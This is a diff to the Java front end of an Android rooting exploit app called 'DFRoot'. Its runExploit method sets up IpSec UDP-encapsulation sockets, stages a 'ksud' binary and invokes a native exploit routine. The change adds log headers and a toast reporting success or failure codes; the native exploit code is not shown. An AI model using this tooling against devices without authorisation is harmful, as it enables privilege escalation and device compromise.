@@ -11,6 +11,7 @@ import android.os.Handler;
 import android.os.Looper;
 import android.util.Log;
 import android.view.View;
+import android.widget.Toast;
 
 import androidx.appcompat.app.AppCompatActivity;
 
@@ -75,6 +76,7 @@ public class MainActivity extends AppCompatActivity implements IReporter {
 
     private void runExploit() {
         try {
+            log("=== setup ===");
             IpSecManager ipsec = (IpSecManager) getSystemService(IPSEC_SERVICE);
 
             IpSecManager.UdpEncapsulationSocket encapSock = ipsec.openUdpEncapsulationSocket();
@@ -106,11 +108,17 @@ public class MainActivity extends AppCompatActivity implements IReporter {
 
             stageAsset(this, "ksud", true, getFilesDir());
             log("ksud staged to: " + new File(getFilesDir(), "ksud").getAbsolutePath());
-            log("running native exploit...");
 
+            log("");
+            log("=== exploit ===");
             int icvLen = 128 / 8;
             String ksudPath = new File(getFilesDir(), "ksud").getAbsolutePath();
             int rc = nativeRunAll(this, encapPort, spiVal, aesKey, hmacKey, icvLen, senderPort, ksudPath, false);
+            final String toastMsg = rc == 0 ? "DFRoot: SUCCESS"
+                    : rc == 1 ? "DFRoot FAILED: ksud exited with error"
+                    : rc == 2 ? "DFRoot FAILED: check logs"
+                    : "DFRoot FAILED: failed to patch files";
+            mMain.post(() -> Toast.makeText(this, toastMsg, Toast.LENGTH_LONG).show());
 
             transform.close();
             spiObj.close();
